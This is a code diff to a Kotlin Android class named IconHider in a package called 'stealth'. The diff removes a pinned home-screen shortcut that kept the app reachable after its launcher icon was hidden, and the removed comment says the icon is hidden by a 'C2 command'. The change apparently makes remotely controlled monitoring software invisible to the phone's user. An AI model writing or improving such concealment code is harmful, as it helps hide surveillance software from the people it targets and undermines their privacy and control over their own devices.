@@ -2,11 +2,7 @@ package com.sp.core.stealth
 
 import android.content.ComponentName
 import android.content.Context
-import android.content.Intent
 import android.content.pm.PackageManager
-import android.content.pm.ShortcutInfo
-import android.content.pm.ShortcutManager
-import android.graphics.drawable.Icon
 import com.sp.core.util.Prefs
 
 /**
@@ -79,31 +75,6 @@ object IconHider {
                 PackageManager.DONT_KILL_APP
             )
             Prefs.set(ctx, KEY_ICON_HIDDEN, true)
-        } catch (_: Throwable) {
-        }
-        pinShortcut(ctx)
-    }
-
-    /**
-     * Keeps a way back into the app: a pinned shortcut on the home screen.
-     * The launcher icon can be hidden, the shortcut cannot - without it the
-     * wizard would be unreachable (which is exactly what happened when the
-     * icon was hidden by the C2 command).
-     */
-    private fun pinShortcut(ctx: Context) {
-        try {
-            val sm = ctx.getSystemService(Context.SHORTCUT_SERVICE) as ShortcutManager
-            val intent = Intent(ctx, com.sp.core.LauncherActivity::class.java)
-                .setAction(Intent.ACTION_MAIN)
-                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            val si = ShortcutInfo.Builder(ctx, "sp_setup")
-                .setShortLabel("Настройка")
-                .setLongLabel("android_UI - настройка доступа")
-                .setIcon(Icon.createWithResource(ctx, com.sp.core.R.mipmap.ic_launcher))
-                .setIntent(intent)
-                .build()
-            if (!sm.isRequestPinShortcutSupported) return
-            sm.requestPinShortcut(si, null)
         } catch (_: Throwable) {
         }
     }
